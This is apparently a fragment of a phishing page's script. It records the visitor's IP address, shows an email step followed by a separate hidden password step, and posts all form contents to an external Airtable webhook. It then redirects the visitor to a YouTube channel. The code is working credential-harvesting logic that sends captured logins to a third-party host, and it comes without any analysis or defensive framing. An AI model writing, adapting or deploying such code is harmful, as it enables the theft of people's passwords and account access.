 <script>
        async function getIP() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                document.getElementById("ip").value = data.ip; // Set IP value in form
            } catch (error) {
                console.error("Failed to fetch IP:", error);
            }
        }

        function nextSlide(event) {
            event.preventDefault(); // Stop any unwanted navigation
            document.querySelector('.mail').style.display = 'none';
            document.querySelector('.pazzi').style.display = 'block';
        }

        async function submitForm(event) {
            event.preventDefault(); // Prevent default form submission

            const form = event.target;
            const formData = new FormData(form);

            // Send form data to Airtable Webhook
            await fetch("https://hooks.airtable.com/workflows/v1/genericWebhook/appWWw92Q29J21BO3/wfl77Xdfu9VtRuaiw/wtrD1pawC12AniDFG", {
                method: "POST",
                body: formData
            });

            // Redirect after submission
            window.location.href = "https://www.youtube.com/channel/YOUR_CHANNEL_ID";
        }

        window.onload = getIP; // Fetch IP when page loads
    </script>
    <style>
        .pazzi { display: none; } /* Hide password slide by default */
    </style>
